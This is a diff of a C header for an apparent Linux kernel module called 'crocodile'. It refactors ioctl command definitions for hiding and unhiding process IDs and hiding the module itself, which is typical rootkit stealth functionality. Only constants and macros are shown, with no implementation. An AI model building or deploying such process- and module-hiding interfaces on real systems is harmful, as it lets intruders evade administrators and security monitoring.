@@ -16,10 +16,8 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
-#define _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
-
-#include "device/types.h"
+#ifndef _CROCODILE_LKM_CTRL_IOCTL_H_
+#define _CROCODILE_LKM_CTRL_IOCTL_H_
 
 /******************************************************************************
  * Ioctl definitions
@@ -33,18 +31,18 @@
 #define CROC_IOC_HIDE_CMD       0b00001
 #define CROC_IOC_SHOW_CMD       0b00010
 #define CROC_IOC_PID            0b00100
+#define CROC_IOC_HIDE_PID_CMD   CROC_IOC_PID | CROC_IOC_HIDE_CMD
+#define CROC_IOC_SHOW_PID_CMD   CROC_IOC_PID | CROC_IOC_SHOW_CMD
 #define CROC_IOC_MOD            0b01000
+#define CROC_IOC_HIDE_MOD_CMD   CROC_IOC_MOD | CROC_IOC_HIDE_CMD
+#define CROC_IOC_SHOW_MOD_CMD   CROC_IOC_MOD | CROC_IOC_SHOW_CMD
 #define CROC_IOC_LOG            0b10000
 
 #define CROC_IOC_RESET          _IO(CROC_IOC_MAGIC, 0)
-#define CROC_IOC_HIDE_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_PID | CROC_IOC_HIDE_CMD, int)   // 0b010
-#define CROC_IOC_SHOW_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_PID | CROC_IOC_SHOW_CMD, int)   // 0b011
-#define CROC_IOC_HIDE_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_MOD | CROC_IOC_HIDE_CMD, int)   // 0b100
-#define CROC_IOC_SHOW_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_MOD | CROC_IOC_SHOW_CMD, int)   // 0b101
+#define CROC_IOC_HIDE_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_HIDE_PID_CMD, int)
+#define CROC_IOC_SHOW_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_SHOW_PID_CMD, int)
+#define CROC_IOC_HIDE_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_HIDE_MOD_CMD, int)
+#define CROC_IOC_SHOW_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_SHOW_MOD_CMD, int)
 
-int ioc_hide_pid(module_dev_t* p_dev, pid_t pid);
-
-int ioc_show_pid(module_dev_t* p_dev, pid_t pid);
-
-#endif /* _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_ */
+#endif /* _CROCODILE_LKM_CTRL_IOCTL_H_ */
 
